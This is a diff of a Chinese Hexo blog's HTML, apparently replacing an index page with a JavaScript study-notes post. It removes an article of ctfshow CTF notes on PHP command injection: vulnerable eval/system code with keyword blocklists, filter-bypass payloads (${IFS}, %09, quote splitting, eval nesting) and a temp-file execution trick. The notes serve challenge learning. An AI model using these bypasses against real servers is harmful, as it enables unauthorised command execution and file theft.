@@ -22,25 +22,29 @@
   <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"e1iauks.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="卷死他们捏！">
-<meta property="og:type" content="website">
-<meta property="og:title" content="E1iaukのblog">
-<meta property="og:url" content="https://e1iauks.github.io/index.html">
+<meta name="description" content="js学习笔记一． Js的用法   和  会告诉 js 在何处开始和结束。   和  之间的代码行包含了 js  在HTML页面中加入js必须按照以上操作在两者中加入js代码。 二． Js输出1.window.alart() 输出。如 window.alart(5+6) 在网页弹窗中就输出 11.   2. 操作 HTML 元素访问某个 HTML 元素，可以使用 document.getElemen">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow知识点总结">
+<meta property="og:url" content="https://e1iauks.github.io/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="E1iaukのblog">
-<meta property="og:description" content="卷死他们捏！">
+<meta property="og:description" content="js学习笔记一． Js的用法   和  会告诉 js 在何处开始和结束。   和  之间的代码行包含了 js  在HTML页面中加入js必须按照以上操作在两者中加入js代码。 二． Js输出1.window.alart() 输出。如 window.alart(5+6) 在网页弹窗中就输出 11.   2. 操作 HTML 元素访问某个 HTML 元素，可以使用 document.getElemen">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-05T12:20:57.000Z">
+<meta property="article:modified_time" content="2022-02-05T12:21:41.692Z">
 <meta property="article:author" content="E1iauk_S">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="JavaScript">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://e1iauks.github.io/">
+<link rel="canonical" href="https://e1iauks.github.io/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://e1iauks.github.io/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","path":"2022/02/05/js学习笔记/","title":"ctfshow知识点总结"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>E1iaukのblog</title>
+<title>ctfshow知识点总结 | E1iaukのblog</title>
   
 
   <script data-pjax>
@@ -82,7 +86,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">E1iaukのblog</h1>
+      <p class="site-title">E1iaukのblog</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -118,7 +122,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -131,6 +135,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">js学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%8E-Js%E7%9A%84%E7%94%A8%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">一． Js的用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%8E-Js%E8%BE%93%E5%87%BA"><span class="nav-number">1.2.</span> <span class="nav-text">二． Js输出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-window-alart-%E8%BE%93%E5%87%BA%E3%80%82"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.window.alart() 输出。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%93%8D%E4%BD%9C-HTML-%E5%85%83%E7%B4%A0"><span class="nav-number">1.3.</span> <span class="nav-text">2. 操作 HTML 元素</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%8E-Js%E8%AF%AD%E6%B3%95"><span class="nav-number">1.4.</span> <span class="nav-text">三． Js语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%8E-Js%E6%B3%A8%E9%87%8A"><span class="nav-number">1.5.</span> <span class="nav-text">四． Js注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%8E-Js%E6%95%B0%E7%BB%84"><span class="nav-number">1.6.</span> <span class="nav-text">五． Js数组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%EF%BC%8E-Js%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.7.</span> <span class="nav-text">六．   Js对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%EF%BC%88js%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%9D%9E%E5%B8%B8%E5%83%8Fc%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%8D%E7%AE%A1%E6%98%AF%E5%88%9B%E5%BB%BA%E8%BF%98%E6%98%AF%E8%AE%BF%E9%97%AE%E9%83%BD%E5%BE%88%E7%B1%BB%E4%BC%BC%EF%BC%89"><span class="nav-number">1.7.1.</span> <span class="nav-text">1.对象的创建（js中的对象非常像c语言中的结构体不管是创建还是访问都很类似）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%AE%BF%E9%97%AE%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"><span class="nav-number">1.7.2.</span> <span class="nav-text">2.访问对象属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="nav-number">1.7.3.</span> <span class="nav-text">3.对象方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E8%AE%BF%E9%97%AE%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="nav-number">1.7.4.</span> <span class="nav-text">4.访问对象方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%EF%BC%8E-Js%E8%BF%90%E7%AE%97"><span class="nav-number">1.8.</span> <span class="nav-text">七．   Js运算</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">1.8.1.</span> <span class="nav-text">用于字符串的 + 运算符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%95%B0%E5%AD%97%E8%BF%9B%E8%A1%8C%E5%8A%A0%E6%B3%95%E8%BF%90%E7%AE%97"><span class="nav-number">1.8.2.</span> <span class="nav-text">对字符串和数字进行加法运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%EF%BC%8EJs%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.9.</span> <span class="nav-text">八．Js正则表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%AF%AD%E6%B3%95"><span class="nav-number">1.10.</span> <span class="nav-text">1.语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95"><span class="nav-number">1.11.</span> <span class="nav-text">2.使用字符串方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%EF%BC%8EJs%E4%BD%BF%E7%94%A8%E8%AF%AF%E5%8C%BA"><span class="nav-number">1.12.</span> <span class="nav-text">九．Js使用误区</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6%E5%BA%94%E7%94%A8%E9%94%99%E8%AF%AF"><span class="nav-number">1.13.</span> <span class="nav-text">1. 赋值运算符应用错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%B5%AE%E7%82%B9%E5%9E%8B%E6%95%B0%E6%8D%AE%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.14.</span> <span class="nav-text">2. 浮点型数据使用注意事项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-js-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E8%A1%8C"><span class="nav-number">1.15.</span> <span class="nav-text">3. js 字符串分行</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -185,144 +190,17 @@
 </noscript>
 
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="E1iauk_S">
-      <meta itemprop="description" content="卷死他们捏！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="E1iaukのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">ctfshow知识点总结</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-02-05 20:20:57 / 修改时间：20:20:42" itemprop="dateCreated datePublished" datetime="2022-02-05T20:20:57+08:00">2022-02-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>1.eval()函数</p>
-<p>字符串按照 PHP 代码来计算。</p>
-<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾（或者？&gt;）。</p>
-<p>\2. file_get_contents（）函数</p>
-<p>将整个文件读入一个字符串</p>
-<p>\3. System（）函数（反引号``和这个函数功能相同 ？可以作为通配符号）</p>
-<p>执行外部程序，并且显示输出（可以执行Linux命令例如 ‘ls’ ‘cp flag.php 1,txt’等）</p>
-<p>4.Eval（）嵌套方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c ``= ``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    eval(``$c``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `   `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此题目中过滤了很多连``的使用都是无效</span><br><span class="line">此时我们可以用eval嵌套</span><br><span class="line">eval``（$_GET[1]）；&amp;1=system（在此就不受任何过滤限制了）；</span><br><span class="line">ps``：1作为参数逃逸了出来这时候我们可以用1来干任何事情</span><br><span class="line"> </span><br><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c ``= ``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    eval(``$c``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `   `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此时禁用了空格和反引号 所以得使用文件包含或者require方法然后用%0a（换行符号）代替空格符号方法如下</span><br><span class="line">?c=include/requlre%0a$_GET[1];&amp;1=``使用hackerbar上面的PHP为协议（LFI功能）查看flag.Php。(封号被禁用的话就可以用？&gt;)</span><br><span class="line"> ``可能有疑问为什么这里不用括号</span><br></pre></td></tr></table></figure>
-
-<p>`在PHP中include require echo print isset unset使用时不需要括号。```</p>
-<p>PHP伪协议总结（参考自<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087%EF%BC%89">https://segmentfault.com/a/1190000018991087）</a></p>
-<p>1.file：//协议</p>
-<p> 用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。</p>
-<p>· <strong>示例</strong>：</p>
-<ol>
-<li>file://[文件的绝对路径和文件名]</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=file://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</a></p>
-<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="图片描述"></p>
-<ol>
-<li>[文件的相对路径和文件名]</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a></p>
-<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="图片描述"></p>
-<ol>
-<li>[http：//网络路径和文件名]</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p>
-<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="图片描述"></p>
-<p><strong>php://</strong> <strong>协议</strong></p>
-<p><strong>作用</strong>：<br> <code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
-<p>（如需了解更多请访问参考网页）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c``=``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  ``system``(``$c``.``&quot; &gt;/dev/null 2&gt;&amp;1&quot;``); `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">这道题的知识点是双写绕过黑洞</span><br><span class="line">如?c=ls;ls这样就可以正常回显解题为?c=tac flag.php;ls</span><br><span class="line">当封号被过滤时可以用ls``&amp;&amp;``（或者||）``ls``但此时&amp;&amp;要用url编码为%26（%7C）</span><br><span class="line">空格被禁时可以用$&#123;IFS&#125;或者%09（ASCII吗的水平制表符tab）来代替。在system中的空格是shell里面的空格不是PHP代码里面的空格。很多人会有疑问当禁用了数字和%后为什么我们还可以加密这是应为在url中会自动解码一次所以%09解码完毕之后就没有数字和%了。url的编码方式都是十六进制。</span><br><span class="line">if(isset(``$_GET``[``&#x27;c&#x27;``]))&#123; `</span><br><span class="line"> `  ``$c``=``$_GET``[``&#x27;c&#x27;``]; `</span><br><span class="line"> `  if(!``preg_match``(``&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;``, ``$c``))&#123; `</span><br><span class="line"> `    ``system``(``$c``.``&quot; &gt;/dev/null 2&gt;&amp;1&quot;``); `</span><br><span class="line"> `  &#125; `</span><br><span class="line"> `&#125;else&#123; `</span><br><span class="line"> `  ``highlight_file``(``__FILE__``); `</span><br><span class="line"> `&#125;</span><br><span class="line">此时禁用了十六进制的09和26所以此时我们不能用带有空格和&amp;的方式查看文件此时shell Linux命令中的nl命令给了我们新的方法先看nl的介绍</span><br><span class="line">将指定的各个&lt;文件&gt;添加行号标注后写到标准输出。</span><br><span class="line">所以此时我们可以使用nl/tac+&lt;+fla’’g.php||(要加密为%7C)ls</span><br><span class="line">&lt;``可以代替空格而’’（此时不支持通配符）可以绕过flag的过滤。</span><br><span class="line">这里发现一个有趣的东西就是每个字符前面加上单引号后就可以绕过正则匹配但是原因不明就是’f’l’a’g.php也是可以的</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">     system(<span class="variable">$c</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;`.`</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时过滤了许多常用命令但是却没有过滤mv（用来移动文件）首先我们ls查看要查看的文件再用？c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt在访问1，txt即可。</span><br></pre></td></tr></table></figure>
-
-<p>// 你们在炫技吗？<br> if(isset($_GET[‘c’])){<br>   $c=$_GET[‘c’];<br>   if(!preg_match(“/;|[a-z]|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>     system($c);<br>   }<br> }else{<br>   highlight_file(<strong>FILE</strong>);<br> }</p>
-<p>看到这道题就会发现他禁用了数字字母&amp;和 ，但是没有过滤.和?所以此题目为无字母数字的命令执行那么我们应该怎么做呢通过查找资料我发现我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过<code>.(``点``)</code>去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020">linux</a>下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）（百度了一下<code>.(``点``)</code>的用法，就是相当于<code>source</code> 可以执行sh命令。）</p>
-<p>在这个之前我们需要构造一个post上传文件的数据包。</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>然后抓包</code>如图</p>
-<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png" alt="在这里插入图片描述"></p>
-<h5 id="构造poc执行命令"><a href="#构造poc执行命令" class="headerlink" title="构造poc执行命令"></a>构造poc执行命令</h5><p><code>?c=.+/???/????????[@-[]</code><br> 注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br> <img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png" alt="在这里插入图片描述">然后在上传文件内容添加sh命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br><span class="line">·        1</span><br><span class="line">·        2</span><br></pre></td></tr></table></figure>
-
-<p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png" alt="在这里插入图片描述"></p>
-<h5 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h5><p><img src="file:///C:/Users/Mr.Gao/AppData/Local/Temp/msohtmlclip1/01/clip_image013.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -335,9 +213,9 @@
       <meta itemprop="name" content="E1iaukのblog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/05/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">ctfshow知识点总结</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow知识点总结
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -361,6 +239,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -370,7 +255,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="js学习笔记"><a href="#js学习笔记" class="headerlink" title="js学习笔记"></a>js学习笔记</h1><h2 id="一．-Js的用法"><a href="#一．-Js的用法" class="headerlink" title="一． Js的用法"></a>一． Js的用法</h2>  <script> 和 </script> 会告诉 js 在何处开始和结束。
+        <h1 id="js学习笔记"><a href="#js学习笔记" class="headerlink" title="js学习笔记"></a>js学习笔记</h1><h2 id="一．-Js的用法"><a href="#一．-Js的用法" class="headerlink" title="一． Js的用法"></a>一． Js的用法</h2>  <script> 和 </script> 会告诉 js 在何处开始和结束。
 
 <script> 和 </script> 之间的代码行包含了 js
 
@@ -464,7 +349,6 @@
 <p>var x = “Hello<br> World!”;<br> 字符串断行需要使用反斜杠()，如下所示:</p>
